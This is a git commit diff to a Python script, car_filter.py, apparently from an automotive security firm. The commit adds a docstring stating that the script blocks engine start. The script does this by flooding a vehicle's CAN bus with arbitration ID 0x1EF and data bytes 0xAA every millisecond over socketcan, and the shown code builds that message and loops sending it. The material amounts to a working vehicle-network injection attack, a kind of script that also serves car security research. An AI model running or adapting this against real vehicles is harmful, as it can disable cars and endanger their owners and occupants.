f27a8189d964a98a2698dd0ad085e6d270ca3db2
David Pilnik <dpilnik@tower-sec.com>
2019-04-07 16:58:45 +0300

    add help to code car_filter.py

--- car_filter.py
+++ car_filter.py
@@ -1,3 +1,9 @@
+"""
+Goal: block eng start
+How to: run python3 car_filter.py
+Doc: the code "block" eng by send id 1EF with data AAAAAAAAAAAAAAAA on freq 0.001s
+"""
+
 import can
 import time
 can.rc['interface'] = 'socketcan_native'
@@ -10,8 +16,6 @@ bus = can.interface.Bus('can0', can_filters=can_filters)
 # msg = can.Message(arbitration_id=ecuId, data=[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF], extended_id=False)
 msg = can.Message(arbitration_id=ecuId, data=[0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA], extended_id=False)
 
-
-print(msg)
 #     def send_periodic(self, msg, period, duration=None, store_task=True):
 # a = bus.send_periodic(msg, 0.01, 120,True)
 while True:
